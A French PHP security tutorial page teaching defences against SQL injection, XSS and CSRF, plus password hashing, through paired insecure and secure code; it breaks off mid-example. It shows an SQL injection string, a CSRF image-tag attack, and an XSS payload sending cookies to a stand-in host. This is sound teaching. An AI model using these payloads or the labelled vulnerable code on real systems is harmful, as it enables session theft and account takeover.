<?php include __DIR__ . '/../includes/header-pro.php'; ?>
<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sécurité en PHP | Formation PHP</title>
    <link rel="stylesheet" href="../assets/css/main.css">
    <link rel="stylesheet" href="../assets/css/filtering-explanations.css">
    <style>
        @media (max-width: 768px) {
            .security-layer[style] {
                float: none !important;
                width: 100% !important;
                margin-right: 0 !important;
            }
        }
    </style>
</head>

<body class="module14">
    <header>
        <h1>Sécurité en PHP</h1>
        <p class="subtitle">Protégez vos applications PHP contre les vulnérabilités courantes et mettez en œuvre les bonnes pratiques de sécurité.</p>
    </header>
    <div class="navigation">
        <a href="13-php-ajax.php" class="nav-button">← Module précédent</a>
        <a href="../../index.php" class="nav-button">Accueil</a>
        <a href="15-architecture-mvc.php" class="nav-button">Module suivant →</a>
    </div>
    <main>
        <section class="section">
            <h2>Introduction à la sécurité en PHP</h2>
            <p>La sécurité est un aspect fondamental du développement web. Les applications PHP sont souvent la cible d'attaques en raison de leur popularité et de leur présence sur de nombreux sites. Comprendre et mettre en œuvre les bonnes pratiques de sécurité est essentiel pour protéger vos applications et les données des utilisateurs.</p>
            <h3>Les principaux niveaux de sécurité</h3>

            <div style="overflow: hidden; clear: both; margin: 20px 0;">
                <div class="security-layer" style="float: left; width: 48%; margin-right: 4%; margin-bottom: 20px; background-color: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); border-left: 5px solid #6a994e; transition: transform 0.3s, box-shadow 0.3s;">
                    <strong style="color: #6a994e; font-size: 1.2em; display: block; margin-bottom: 10px; font-weight: 600;">Validation des données utilisateur</strong>
                    <p style="margin: 0; line-height: 1.5;">Vérifier et nettoyer toutes les entrées utilisateur</p>
                </div>
                <div class="security-layer" style="float: left; width: 48%; margin-bottom: 20px; background-color: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); border-left: 5px solid #1b4965; transition: transform 0.3s, box-shadow 0.3s;">
                    <strong style="color: #1b4965; font-size: 1.2em; display: block; margin-bottom: 10px; font-weight: 600;">Protection contre les injections</strong>
                    <p style="margin: 0; line-height: 1.5;">Prévenir les injections SQL, XSS, et autres attaques</p>
                </div>
                <div class="security-layer" style="float: left; width: 48%; margin-right: 4%; clear: left; background-color: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); border-left: 5px solid #5f0f40; transition: transform 0.3s, box-shadow 0.3s;">
                    <strong style="color: #5f0f40; font-size: 1.2em; display: block; margin-bottom: 10px; font-weight: 600;">Configuration et déploiement</strong>
                    <p style="margin: 0; line-height: 1.5;">Sécuriser l'environnement de l'application</p>
                </div>
                <div class="security-layer" style="float: left; width: 48%; background-color: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1); border-left: 5px solid #9e2a2b; transition: transform 0.3s, box-shadow 0.3s;">
                    <strong style="color: #9e2a2b; font-size: 1.2em; display: block; margin-bottom: 10px; font-weight: 600;">Authentification et autorisation sécurisées</strong>
                    <p style="margin: 0; line-height: 1.5;">Gérer les mots de passe et les sessions de manière sécurisée</p>
                </div>
            </div>

            <div class="danger-box">
                <p><strong>Attention :</strong> La sécurité est un processus continu, pas un état final. Restez informé des nouvelles vulnérabilités et mettez régulièrement à jour vos connaissances et vos applications.</p>
            </div>
        </section>

        <section class="section">
            <h2>Validation et filtrage des données utilisateur</h2>
            <p>La première ligne de défense consiste à valider et filtrer toutes les données provenant de l'utilisateur, qu'elles proviennent de formulaires, d'URL, de cookies ou d'autres sources.</p>

            <h3>Règle d'or : Ne jamais faire confiance aux données utilisateur</h3>
            <p>Toute donnée provenant de l'extérieur de votre application doit être considérée comme potentiellement malveillante, et doit être validée et nettoyée avant d'être utilisée.</p>
            <div class="security-comparison">
                <div class="insecure-code">
                    <div class="example-header">
                        <span class="header-title">Code non sécurisé</span>
                        <span class="risk-badge high-risk">Risque élevé</span>
                    </div>
                    <pre><code class="language-php">
<span class="comment">// Récupération d'un ID sans validation</span>
<span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];

<span class="comment">// Construction de la requête SQL directement avec la variable</span>
<span class="variable">$query</span> = <span class="string">"SELECT * FROM utilisateurs WHERE id = $id"</span>;

<span class="comment">// Récupération d'un nom sans échappement</span>
<span class="variable">$nom</span> = <span class="variable">$_POST</span>[<span class="string">'nom'</span>];
<span class="keyword">echo</span> <span class="string">"Bonjour, "</span> . <span class="variable">$nom</span> . <span class="string">"!"</span>;
</code></pre>
                </div>
                <div class="secure-code">
                    <div class="example-header">
                        <span class="header-title">Code sécurisé</span>
                        <span class="risk-badge secure-badge">Sécurisé</span>
                    </div>
                    <pre><code class="language-php">
<span class="comment">// Validation et conversion en entier</span>
<span class="variable">$id</span> = <span class="function">filter_input</span>(<span class="constant">INPUT_GET</span>, <span class="string">'id'</span>, <span class="constant">FILTER_VALIDATE_INT</span>);

<span class="keyword">if</span> (<span class="variable">$id</span> === <span class="keyword">false</span> || <span class="variable">$id</span> === <span class="keyword">null</span>) {
    <span class="comment">// Gestion de l'erreur</span>
    <span class="keyword">die</span>(<span class="string">'ID invalide'</span>);
}

<span class="comment">// Récupération et échappement d'un nom</span>
<span class="variable">$nom</span> = <span class="function">filter_input</span>(<span class="constant">INPUT_POST</span>, <span class="string">'nom'</span>, <span class="constant">FILTER_SANITIZE_STRING</span>);
<span class="keyword">echo</span> <span class="string">"Bonjour, "</span> . <span class="function">htmlspecialchars</span>(<span class="variable">$nom</span>) . <span class="string">"!"</span>;
</code></pre>
                </div>
            </div>

            <h3>Les fonctions de filtrage en PHP</h3>
            <p>PHP fournit des fonctions intégrées pour valider et filtrer les données :</p>

            <div class="example">
                <div class="example-header">Utilisation des fonctions de filtrage</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="comment">// Validation d'une adresse email</span>
<span class="variable">$email</span> = <span class="function">filter_input</span>(<span class="constant">INPUT_POST</span>, <span class="string">'email'</span>, <span class="constant">FILTER_VALIDATE_EMAIL</span>);

<span class="keyword">if</span> (!<span class="variable">$email</span>) {
    <span class="keyword">echo</span> <span class="string">"L'adresse email est invalide."</span>;
}

<span class="comment">// Validation et nettoyage d'une URL</span>
<span class="variable">$url</span> = <span class="function">filter_input</span>(<span class="constant">INPUT_POST</span>, <span class="string">'site_web'</span>, <span class="constant">FILTER_VALIDATE_URL</span>);

<span class="comment">// Validation d'un nombre entier avec des options</span>
<span class="variable">$age</span> = <span class="function">filter_input</span>(<span class="constant">INPUT_POST</span>, <span class="string>'age'</span>, <span class="constant">FILTER_VALIDATE_INT</span>, [
    <span class="string">'options'</span> => [
        <span class="string">'min_range'</span> => 1,
        <span class="string">'max_range'</span> => 120
    ]
]);

<span class="comment">// Nettoyage d'une chaîne de caractères</span>
<span class="variable">$commentaire</span> = <span class="function">filter_input</span>(<span class="constant">INPUT_POST</span>, <span class="string>'commentaire'</span>, <span class="constant">FILTER_SANITIZE_STRING</span>);

<span class="comment">// Assainissement personnalisé avec des expressions régulières</span>
<span class="variable">$username</span> = <span class="function">filter_input</span>(<span class="constant">INPUT_POST</span>, <span class="string>'username'</span>, <span class="constant">FILTER_VALIDATE_REGEXP</span>, [
    <span class="string">'options'</span> => [
        <span class="string">'regexp'</span> => <span class="string>'/^[a-zA-Z0-9_]{3,20}$/'</span>
    ]
]);
</code></pre>
                </div>
            </div>

            <div class="filtering-explanations">
                <h4>Explication détaillée des fonctions de filtrage</h4>
                <table class="filter-functions-table">
                    <tr>
                        <th>Fonction/Filtre</th>
                        <th>Description</th>
                        <th>Exemple d'utilisation</th>
                    </tr>
                    <tr>
                        <td><code>filter_input()</code></td>
                        <td>Récupère et filtre une variable externe (GET, POST, etc.) en une seule opération. Beaucoup plus sécurisée que l'accès direct aux superglobales.</td>
                        <td><code>filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);</code></td>
                    </tr>
                    <tr>
                        <td><code>FILTER_VALIDATE_EMAIL</code></td>
                        <td>Vérifie si la valeur est une adresse email syntaxiquement valide. Renvoie l'email si valide, sinon <code>false</code>.</td>
                        <td>Vérifie le format user@domain.com mais ne garantit pas que l'adresse existe réellement.</td>
                    </tr>
                    <tr>
                        <td><code>FILTER_VALIDATE_URL</code></td>
                        <td>Vérifie si la valeur est une URL valide selon la RFC. Vérifie le schéma (http, https, etc.) et la syntaxe générale.</td>
                        <td>Utile pour valider les liens, adresses de sites web, ou API endpoints.</td>
                    </tr>
                    <tr>
                        <td><code>FILTER_VALIDATE_INT</code></td>
                        <td>Vérifie si la valeur est un nombre entier. Accepte les options min_range et max_range pour définir des limites.</td>
                        <td>Parfait pour valider des IDs, âges, quantités ou tout autre entier avec contraintes.</td>
                    </tr>
                    <tr>
                        <td><code>FILTER_SANITIZE_STRING</code></td>
                        <td>Supprime ou encode les caractères spéciaux HTML. Utile pour nettoyer les entrées textuelles des utilisateurs.</td>
                        <td>À utiliser pour les commentaires, messages, ou toute saisie textuelle libre.</td>
                    </tr>
                    <tr>
                        <td><code>FILTER_VALIDATE_REGEXP</code></td>
                        <td>Valide une chaîne contre une expression régulière personnalisée. Offre une flexibilité maximale pour des formats spécifiques.</td>
                        <td>Idéal pour valider des noms d'utilisateur, mots de passe, ou formats personnalisés.</td>
                    </tr>
                    <tr>
                        <td><code>FILTER_SANITIZE_NUMBER_INT</code></td>
                        <td>Supprime tous les caractères sauf les chiffres, + et -. Ne valide pas que le résultat est un entier valide.</td>
                        <td>À combiner avec <code>FILTER_VALIDATE_INT</code> pour une sécurité maximale.</td>
                    </tr>
                </table>
            </div>
        </section>

        <section class="section">
            <h2>Protection contre les injections SQL</h2>
            <p>Les injections SQL sont parmi les vulnérabilités les plus courantes et les plus dangereuses dans les applications web. Elles permettent à un attaquant d'exécuter du code SQL malveillant dans votre base de données.</p>

            <h3>Comment fonctionnent les injections SQL</h3>
            <div class="example">
                <div class="example-header">Exemple d'injection SQL</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="comment">// Code vulnérable</span>
<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];
<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];

<span class="variable">$query</span> = <span class="string">"SELECT * FROM users WHERE username='$username' AND password='$password'"</span>;

<span class="comment">// Un attaquant peut entrer: admin' --</span>
<span class="comment">// La requête devient alors:</span>
<span class="comment">// SELECT * FROM users WHERE username='admin' -- AND password='peu importe'</span>
<span class="comment">// Tout ce qui suit -- est considéré comme un commentaire en SQL</span>
</code></pre>
                </div>
            </div>

            <h3>Utilisation des requêtes préparées avec PDO</h3>
            <p>La meilleure façon de prévenir les injections SQL est d'utiliser des requêtes préparées avec PDO ou MySQLi.</p>

            <div class="security-comparison">
                <div class="insecure-code">
                    <div class="example-header">
                        <span class="header-title">Code non sécurisé</span>
                        <span class="risk-badge high-risk">Risque élevé</span>
                    </div>
                    <pre><code class="language-php">
<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];
<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="class-name">PDO</span>(<span class="string">"mysql:host=$servername;dbname=$dbname"</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);

<span class="comment">// Concaténation directe de variables dans la requête SQL</span>
<span class="variable">$query</span> = <span class="string">"SELECT * FROM users WHERE username = '$username'"</span>;
<span class="variable">$result</span> = <span class="variable">$conn</span>-><span class="function">query</span>(<span class="variable">$query</span>);
</code></pre>
                </div>
                <div class="secure-code">
                    <div class="example-header">
                        <span class="header-title">Code sécurisé</span>
                        <span class="risk-badge secure-badge">Sécurisé</span>
                    </div>
                    <pre><code class="language-php">
<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];
<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="class-name">PDO</span>(<span class="string">"mysql:host=$servername;dbname=$dbname"</span>, <span class="variable">$user</span>, <span class="variable">$password</span>);

<span class="comment">// Utilisation de requêtes préparées</span>
<span class="variable">$stmt</span> = <span class="variable">$conn</span>-><span class="function">prepare</span>(<span class="string">"SELECT * FROM users WHERE username = :username"</span>);
<span class="variable">$stmt</span>-><span class="function">bindParam</span>(<span class="string">':username'</span>, <span class="variable">$username</span>);
<span class="variable">$stmt</span>-><span class="function">execute</span>();

<span class="variable">$user</span> = <span class="variable">$stmt</span>-><span class="function">fetch</span>(<span class="class-name">PDO</span>::<span class="constant">FETCH_ASSOC</span>);
</code></pre>
                </div>
            </div>

            <div class="example">
                <div class="example-header">Requête préparée avec plusieurs paramètres</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="comment">// Insertion sécurisée de données dans une base</span>
<span class="variable">$stmt</span> = <span class="variable">$conn</span>-><span class="function">prepare</span>(<span class="string">"INSERT INTO users (username, email, created_at) VALUES (:username, :email, :created_at)"</span>);

<span class="comment">// Liaison des paramètres</span>
<span class="variable">$stmt</span>-><span class="function">bindParam</span>(<span class="string">':username'</span>, <span class="variable">$username</span>);
<span class="variable">$stmt</span>-><span class="function">bindParam</span>(<span class="string">':email'</span>, <span class="variable">$email</span>);
<span class="variable">$stmt</span>-><span class="function">bindParam</span>(<span class="string">':created_at'</span>, <span class="function">date</span>(<span class="string">'Y-m-d H:i:s'</span>));

<span class="comment">// Exécution de la requête</span>
<span class="variable">$stmt</span>-><span class="function">execute</span>();

<span class="comment">// Alternative avec un tableau de valeurs</span>
<span class="variable">$stmt</span> = <span class="variable">$conn</span>-><span class="function">prepare</span>(<span class="string">"SELECT * FROM posts WHERE category = ? AND published = ?"</span>);
<span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$category</span>, <span class="constant">true</span>]);
</code></pre>
                </div>
            </div>

            <div class="warning-box">
                <p><strong>Important :</strong> Les requêtes préparées protègent contre les injections SQL, mais n'oubliez pas que vous devez toujours valider les données en fonction de vos règles métier (par exemple, vérifier qu'un ID est positif ou qu'un email est valide).</p>
            </div>
        </section>

        <section class="section">
            <h2>Protection contre les attaques XSS (Cross-Site Scripting)</h2>
            <p>Les attaques XSS permettent à un attaquant d'injecter du code JavaScript malveillant qui s'exécutera dans le navigateur de l'utilisateur. Ces attaques peuvent être utilisées pour voler des cookies de session, rediriger vers des sites malveillants ou manipuler le contenu de la page.</p>

            <h3>Types d'attaques XSS</h3>
            <ul>
                <li><strong>XSS stocké</strong> : Le code malveillant est stocké dans la base de données et affiché à chaque fois que la page est chargée</li>
                <li><strong>XSS réfléchi</strong> : Le code malveillant est inclus dans l'URL ou dans un formulaire et renvoyé immédiatement à l'utilisateur</li>
                <li><strong>XSS basé sur le DOM</strong> : Le code malveillant modifie directement le DOM côté client</li>
            </ul>

            <div class="security-comparison">
                <div class="insecure-code">
                    <div class="example-header">
                        <span class="header-title">Code vulnérable au XSS</span>
                        <span class="risk-badge high-risk">Risque élevé</span>
                    </div>
                    <pre><code class="language-php">
<span class="comment">// Affichage direct de données utilisateur</span>
<span class="variable">$commentaire</span> = <span class="variable">$_POST</span>[<span class="string">'commentaire'</span>];
<span class="keyword">echo</span> <span class="string">"&lt;div class='commentaire'&gt;"</span> . <span class="variable">$commentaire</span> . <span class="string">"&lt;/div&gt;"</span>;

<span class="comment">// Un attaquant pourrait soumettre :</span>
<span class="comment">// &lt;script&gt;document.location='https://site-malveillant.com/steal.php?cookie='+document.cookie&lt;/script&gt;</span>
</code></pre>
                </div>
                <div class="secure-code">
                    <div class="example-header">
                        <span class="header-title">Code protégé contre le XSS</span>
                        <span class="risk-badge secure-badge">Sécurisé</span>
                    </div>
                    <pre><code class="language-php">
<span class="comment">// Échappement des caractères spéciaux HTML</span>
<span class="variable">$commentaire</span> = <span class="variable">$_POST</span>[<span class="string">'commentaire'</span>];
<span class="variable">$commentaire_securise</span> = <span class="function">htmlspecialchars</span>(<span class="variable">$commentaire</span>, <span class="constant">ENT_QUOTES</span>, <span class="string">'UTF-8'</span>);

<span class="keyword">echo</span> <span class="string">"&lt;div class='commentaire'&gt;"</span> . <span class="variable">$commentaire_securise</span> . <span class="string">"&lt;/div&gt;"</span>;
</code></pre>
                </div>
            </div>

            <h3>Fonctions de protection contre le XSS</h3>
            <div class="example">
                <div class="example-header">Outils de prévention XSS</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="comment">// htmlspecialchars - Convertit les caractères spéciaux en entités HTML</span>
<span class="variable">$texte_sécurisé</span> = <span class="function">htmlspecialchars</span>(<span class="variable">$input</span>, <span class="constant">ENT_QUOTES</span>, <span class="string>'UTF-8'</span>);

<span class="comment">// htmlentities - Convertit tous les caractères qui ont des entités HTML</span>
<span class="variable">$texte_sécurisé</span> = <span class="function">htmlentities</span>(<span class="variable">$input</span>, <span class="constant">ENT_QUOTES</span>, <span class="string>'UTF-8'</span>);

<span class="comment">// strip_tags - Supprime les balises HTML et PHP</span>
<span class="variable">$texte_sans_balises</span> = <span class="function">strip_tags</span>(<span class="variable">$input</span>);

<span class="comment">// strip_tags avec balises autorisées</span>
<span class="variable">$texte_formaté</span> = <span class="function">strip_tags</span>(<span class="variable">$input</span>, <span class="string">'&lt;p&gt;&lt;br&gt;&lt;strong&gt;&lt;em&gt;'</span>);
</code></pre>
                </div>
            </div>

            <div class="tip-box">
                <p><strong>Bonne pratique :</strong> Appliquez toujours <code>htmlspecialchars()</code> lors de l'affichage de données provenant de sources externes (base de données, utilisateurs, API, etc.), même si vous pensez avoir déjà nettoyé les données.</p>
            </div>

            <h3>En-têtes HTTP de sécurité</h3>
            <p>Vous pouvez également ajouter des en-têtes HTTP pour renforcer la sécurité contre les attaques XSS :</p>

            <div class="example">
                <div class="example-header">En-têtes de sécurité</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="comment">// Content Security Policy (CSP)</span>
<span class="function">header</span>(<span class="string">"Content-Security-Policy: default-src 'self';"</span>);

<span class="comment">// X-XSS-Protection (pour les navigateurs plus anciens)</span>
<span class="function">header</span>(<span class="string">"X-XSS-Protection: 1; mode=block"</span>);

<span class="comment">// X-Content-Type-Options</span>
<span class="function">header</span>(<span class="string">"X-Content-Type-Options: nosniff"</span>);

<span class="comment">// Référrer-Policy</span>
<span class="function">header</span>(<span class="string">"Referrer-Policy: strict-origin-when-cross-origin"</span>);
</code></pre>
                </div>
            </div>
        </section>

        <section class="section">
            <h2>Protection contre les attaques CSRF (Cross-Site Request Forgery)</h2>
            <p>Les attaques CSRF forcent un utilisateur authentifié à exécuter des actions non désirées sur un site web où il est connecté. Par exemple, un attaquant pourrait forcer un utilisateur à changer son mot de passe ou à effectuer un transfert d'argent sans son consentement.</p>

            <h3>Comment fonctionnent les attaques CSRF</h3>
            <div class="example">
                <div class="example-header">Exemple d'attaque CSRF</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="comment">// Site vulnérable qui change le mot de passe sans vérification</span>
<span class="comment">// http://banque.exemple.com/change_password.php?nouveau_mdp=HackedPass123</span>

<span class="comment">// L'attaquant peut créer une page avec ce code :</span>
<span class="html"><span class="tag">&lt;img</span> <span class="attr">src</span>=<span class="string">"http://banque.exemple.com/change_password.php?nouveau_mdp=HackedPass123"</span> <span class="attr">width</span>=<span class="string">"0"</span> <span class="attr">height</span>=<span class="string">"0"</span><span class="tag">&gt;</span></span>

<span class="comment">// Si l'utilisateur visite cette page malveillante alors qu'il est connecté à sa banque,</span>
<span class="comment">// son mot de passe sera changé sans son consentement.</span>
</code></pre>
                </div>
            </div>

            <h3>Implémentation d'une protection CSRF</h3>
            <p>La protection contre le CSRF repose généralement sur l'utilisation de jetons (tokens) uniques :</p>

            <div class="security-comparison">
                <div class="insecure-code">
                    <div class="example-header">
                        <span class="header-title">Formulaire sans protection CSRF</span>
                        <span class="risk-badge high-risk">Risque élevé</span>
                    </div>
                    <pre><code class="language-html">
<span class="tag">&lt;form</span> <span class="attr">action</span>=<span class="string">"traitement.php"</span> <span class="attr">method</span>=<span class="string">"post"</span><span class="tag">&gt;</span>
    <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="tag">/&gt;</span>
    <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="tag">/&gt;</span>
    <span class="tag">&lt;button</span> <span class="attr">type</span>=<span class="string">"submit"</span><span class="tag">&gt;</span>Connexion<span class="tag">&lt;/button&gt;</span>
<span class="tag">&lt;/form&gt;</span>
</code></pre>
                </div>
                <div class="secure-code">
                    <div class="example-header">
                        <span class="header-title">Formulaire avec protection CSRF</span>
                        <span class="risk-badge secure-badge">Sécurisé</span>
                    </div>
                    <pre><code class="language-php">
<span class="php-tag">&lt;?php</span>
<span class="comment">// Génère un token et le stocke en session</span>
<span class="function">session_start</span>();
<span class="keyword">if</span> (!<span class="function">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'csrf_token'</span>])) {
    <span class="variable">$_SESSION</span>[<span class="string">'csrf_token'</span>] = <span class="function">bin2hex</span>(<span class="function">random_bytes</span>(32));
}
<span class="variable">$token</span> = <span class="variable">$_SESSION</span>[<span class="string">'csrf_token'</span>];
<span class="php-tag">?&gt;</span>

<span class="tag">&lt;form</span> <span class="attr">action</span>=<span class="string">"traitement.php"</span> <span class="attr">method</span>=<span class="string">"post"</span><span class="tag">&gt;</span>
    <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrf_token"</span> <span class="attr">value</span>=<span class="string">"&lt;?php echo $token; ?&gt;"</span> <span class="tag">/&gt;</span>
    <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="tag">/&gt;</span>
    <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="tag">/&gt;</span>
    <span class="tag">&lt;button</span> <span class="attr">type</span>=<span class="string">"submit"</span><span class="tag">&gt;</span>Connexion<span class="tag">&lt;/button&gt;</span>
<span class="tag">&lt;/form&gt;</span>
</code></pre>
                </div>
            </div>

            <h3>Vérification du token CSRF côté serveur</h3>
            <div class="example">
                <div class="example-header">Traitement du formulaire avec vérification CSRF</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="php-tag">&lt;?php</span>
<span class="function">session_start</span>();

<span class="comment">// Vérification de la présence et validité du token CSRF</span>
<span class="keyword">if</span> (!<span class="function">isset</span>(<span class="variable">$_POST</span>[<span class="string">'csrf_token'</span>]) || 
    !<span class="function">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'csrf_token'</span>]) || 
    <span class="variable">$_POST</span>[<span class="string">'csrf_token'</span>] !== <span class="variable">$_SESSION</span>[<span class="string">'csrf_token'</span>]) {
    
    <span class="comment">// Token invalide ou manquant</span>
    <span class="function">die</span>(<span class="string">'Erreur de validation CSRF. Veuillez réessayer.'</span>);
}

<span class="comment">// Régénérer le token après chaque utilisation (protection contre les attaques de rejeu)</span>
<span class="variable">$_SESSION</span>[<span class="string">'csrf_token'</span>] = <span class="function">bin2hex</span>(<span class="function">random_bytes</span>(32));

<span class="comment">// Traitement du formulaire...</span>
<span class="php-tag">?&gt;</span>
</code></pre>
                </div>
            </div>

            <h3>Gestion de l'expiration des tokens CSRF</h3>
            <p>Pour plus de sécurité, vous pouvez implémenter une expiration des tokens CSRF :</p>

            <div class="example">
                <div class="example-header">Tokens CSRF avec expiration</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="php-tag">&lt;?php</span>
<span class="function">session_start</span>();

<span class="comment">// Génération d'un token avec horodatage</span>
<span class="keyword">function</span> <span class="function-declaration">generateCsrfToken</span>() {
    <span class="variable">$token</span> = <span class="function">bin2hex</span>(<span class="function">random_bytes</span>(32));
    <span class="variable">$_SESSION</span>[<span class="string">'csrf_token'</span>] = <span class="variable">$token</span>;
    <span class="variable">$_SESSION</span>[<span class="string">'csrf_token_time'</span>] = <span class="function">time</span>();
    <span class="keyword">return</span> <span class="variable">$token</span>;
}

<span class="comment">// Vérification du token avec expiration (30 minutes)</span>
<span class="keyword">function</span> <span class="function-declaration">validateCsrfToken</span>(<span class="variable">$token</span>, <span class="variable">$expiration</span> = 1800) {
    <span class="keyword">if</span> (
        !<span class="function">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'csrf_token'</span>]) || 
        !<span class="function">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'csrf_token_time'</span>]) || 
        <span class="variable">$token</span> !== <span class="variable">$_SESSION</span>[<span class="string>'csrf_token'</span>]
    ) {
        <span class="keyword">return</span> <span class="keyword">false</span>;
    }
    
    <span class="comment">// Vérification de l'expiration</span>
    <span class="keyword">if</span> (<span class="function">time</span>() - <span class="variable">$_SESSION</span>[<span class="string>'csrf_token_time'</span>] > <span class="variable">$expiration</span>) {
        <span class="comment">// Token expiré</span>
        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string>'csrf_token'</span>]);
        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string>'csrf_token_time'</span>]);
        <span class="keyword">return</span> <span class="keyword">false</span>;
    }
    
    <span class="keyword">return</span> <span class="keyword">true</span>;
}
<span class="php-tag">?&gt;</span>
</code></pre>
                </div>
            </div>

            <div class="tip-box">
                <p><strong>Conseils avancés pour la protection CSRF :</strong></p>
                <ul>
                    <li>Utilisez des jetons spécifiques à chaque formulaire avec un identifiant unique</li>
                    <li>Régénérez les jetons après chaque utilisation</li>
                    <li>Implémentez une protection "double soumission de cookie" pour les API</li>
                    <li>Utilisez l'en-tête <code>SameSite=<span class="SameSiteLax">Lax</span></code> ou <code>SameSite=<span class="SameSiteStrict">Strict</span></code> pour les cookies</li>
                    <li>Pour les API REST, utilisez également les en-têtes <code><span class="X-CSRF-TOKEN">X-CSRF-TOKEN</span></code> ou <code><span class="X-XSRF-TOKEN">X-XSRF-TOKEN</span></code></li>
                </ul>
            </div>
        </section>

        <section class="section">
            <h2>Sécurité des mots de passe</h2>
            <p>La gestion sécurisée des mots de passe est essentielle pour protéger les comptes utilisateurs. Les mots de passe ne doivent jamais être stockés en clair dans une base de données.</p>
            <div class="security-diagram">
                <h3>Cycle de vie d'un mot de passe sécurisé</h3>
                <div class="security-flow">
                    <div class="security-step">
                        <strong>1. Création</strong>
                        <p>L'utilisateur crée un mot de passe fort selon les règles définies</p>
                    </div>
                    <div class="security-step">
                        <strong>2. Hashage</strong>
                        <p>Le mot de passe est haché avec un algorithme sécurisé (Argon2id, bcrypt)</p>
                    </div>
                    <div class="security-step">
                        <strong>3. Stockage</strong>
                        <p>Seul le hash est stocké dans la base de données, jamais le mot de passe en clair</p>
                    </div>
                    <div class="security-step">
                        <strong>4. Vérification</strong>
                        <p>Lors de la connexion, le mot de passe saisi est haché et comparé au hash stocké</p>
                    </div>
                </div>
            </div>

            <h3>Utilisation des fonctions de hachage modernes</h3>
            <div class="security-comparison">
                <div class="insecure-code">
                    <div class="example-header">
                        <span class="header-title">Méthodes obsolètes</span>
                        <span class="risk-badge high-risk">Risque élevé</span>
                    </div>
                    <pre><code class="language-php">
<span class="comment">// NE JAMAIS UTILISER CES MÉTHODES !</span>
<span class="variable">$password</span> = <span class="string">"mot_de_passe"</span>;

<span class="comment">// Stockage en clair</span>
<span class="variable">$stored_password</span> = <span class="variable">$password</span>;  <span class="comment">// TRÈS DANGEREUX !</span>

<span class="comment">// MD5 (cassable en quelques secondes)</span>
<span class="variable">$md5_hash</span> = <span class="function">md5</span>(<span class="variable">$password</span>);  <span class="comment">// OBSOLÈTE !</span>

<span class="comment">// SHA-1 (également vulnérable)</span>
<span class="variable">$sha1_hash</span> = <span class="function">sha1</span>(<span class="variable">$password</span>);  <span class="comment">// OBSOLÈTE !</span>
</code></pre>
                </div>
                <div class="secure-code">
                    <div class="example-header">
                        <span class="header-title">Méthodes recommandées</span>
                        <span class="risk-badge secure-badge">Sécurisé</span>
                    </div>
                    <pre><code class="language-php">
<span class="comment">// Hashage sécurisé avec password_hash() (utilise bcrypt par défaut)</span>
<span class="variable">$password</span> = <span class="string">"mot_de_passe"</span>;

<span class="comment">// Hashage avec bcrypt (coût par défaut = 10)</span>
<span class="variable">$hash</span> = <span class="function">password_hash</span>(<span class="variable">$password</span>, <span class="constant">PASSWORD_DEFAULT</span>);

<span class="comment">// Hashage avec bcrypt (coût personnalisé)</span>
<span class="variable">$hash</span> = <span class="function">password_hash</span>(<span class="variable">$password</span>, <span class="constant">PASSWORD_BCRYPT</span>, [
    <span class="string">'cost'</span> => 12
]);

<span class="comment">// Utiliser Argon2id (PHP 7.3+, recommandé)</span>
<span class="variable">$hash</span> = <span class="function">password_hash</span>(<span class="variable">$password</span>, <span class="constant">PASSWORD_ARGON2ID</span>);
</code></pre>
                </div>
            </div>

            <h3>Vérification des mots de passe</h3>
            <div class="example">
                <div class="example-header">Vérification sécurisée des mots de passe</div>
                <div class="example-content">
                    <pre><code class="language-php">
<span class="comment">// À l'inscription : hashage du mot de passe</span>
<span class="variable">$hash</span> = <span class="function">password_hash</span>(<span class="variable">$_POST</span>[<span class="string">'password'</span>], <span class="constant">PASSWORD_DEFAULT</span>);
<span class="comment">// Stocker $hash dans la base de données</span>

<span class="comment">// À la connexion : vérification du mot de passe</span>
<span class="comment">// $hash_from_db est récupéré depuis la base de données pour l'utilisateur</span>
<span class="keyword">if</span> (<span class="function">password_verify</span>(<span class="variable">$_POST</span>[<span class="string>'password'</span>], <span class="variable">$hash_from_db</span>)) {
    <span class="comment">// Mot de passe correct</span>
